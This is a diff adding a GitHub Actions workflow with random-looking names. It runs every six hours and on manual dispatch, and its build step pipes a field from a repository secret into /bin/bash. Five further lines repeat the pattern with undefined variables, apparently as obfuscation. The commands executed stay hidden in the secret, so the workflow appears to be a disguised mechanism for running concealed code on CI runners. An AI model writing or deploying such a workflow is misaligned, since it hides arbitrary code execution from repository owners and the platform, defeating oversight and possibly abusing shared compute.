@@ -1,0 +1,22 @@
+name: dongchudai5647
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '11 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: dongchudai5647
+        env:
+          x6821: ${{ secrets.x6821 }}
+        run: |
+          echo $x6821 | jq -r .v95789 | /bin/bash
+          echo $cmvnr19 | jq -r .nfa95874 | /bin/bash
+          echo $k63 | jq -r .xkus2203 | /bin/bash
+          echo $alx0 | jq -r .hqkcd512 | /bin/bash
+          echo $tvq4 | jq -r .zsu4 | /bin/bash
+          echo $zvzsc03092 | jq -r .cp51 | /bin/bash
+
